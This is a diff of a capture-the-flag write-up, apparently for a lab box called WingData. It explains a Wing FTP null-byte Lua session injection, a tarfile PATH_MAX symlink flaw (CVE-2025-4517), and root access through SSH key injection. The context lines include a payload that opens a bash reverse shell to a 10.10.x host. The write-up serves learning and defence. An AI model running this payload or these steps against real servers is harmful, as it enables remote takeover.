@@ -84,17 +84,13 @@ Key observations:
  ## The Vulnerability Mechanics
 
 Wing FTP Server handles session data by creating Lua-based session files on the local filesystem. When a user attempts to log in, the server processes the username and stores it within a Lua table.
-
 By injecting a null byte, an attacker can prematurely terminate the intended string and “break out” of the Lua string variable. This allows the attacker to append arbitrary Lua code that the server will execute when it next loads or processes the session file.
 
-## Vulnerability Analysis: “What the NULL?!”
+## Vulnerability Analysis
 
 This vulnerability enables pre-authentication remote code execution, leading to full system compromise. Although Wing FTP allows anonymous logins without a password, reverse engineering reveals a deeper flaw in how sessions are stored.
-
 The core issue lies in how session data is persisted. Instead of safe serialization formats (JSON, database records), Wing FTP writes sessions as Lua scripts that are later executed by the server using dofile("session_file").
-
 A typical session file looks like:
-
 Session = {
   username = "user",
   ip = "1.2.3.4",
@@ -104,7 +100,7 @@ Session = {
 
 Because dofile treats this file as executable code, fields such as username become injection vectors.
 
-## The Null Byte Discrepancy:
+## The Null Byte Discrepancy
 Internally, Wing FTP mixes C/C++ string handling with Lua string processing.
 
     Validation: strlen sees "admin\0evil" as "admin". The NULL byte terminates the string check.
@@ -136,7 +132,7 @@ Conceptual Payload: admin%00"]]..os.execute('bash -c "bash -i >& /dev/tcp/10.10.
 
     Vulnerability: PATH_MAX Overflow (CVE-2025-4517)
 
-## The vulnerability, CVE-2025-4517, exploits an edge case in os.path.realpath().
+## The vulnerability CVE-2025-4517 exploits an edge case in os.path.realpath
 
     Theory: The data filter relies on os.path.realpath() to canonicalize paths and check if they stay within the staging directory.
     The Flaw: If a path (specifically a chain of symlinks) exceeds the filesystem’s PATH_MAX (typically 4096 bytes), realpath() may return an incomplete result without raising an error.
@@ -174,7 +170,7 @@ Check for sudo privileges: sudo -l. Often, you will find a specific script that 
 
 On WingData, keep an eye out for a script that handles data processing or backup routines.
 
-## Exploitation Strategy: 
+## Exploitation Strategy
 If the script allows you to write content to a location of your choice, the easiest path to root is:
 
     SSH Key Injection: Write your public SSH key to /root/.ssh/authorized_keys.
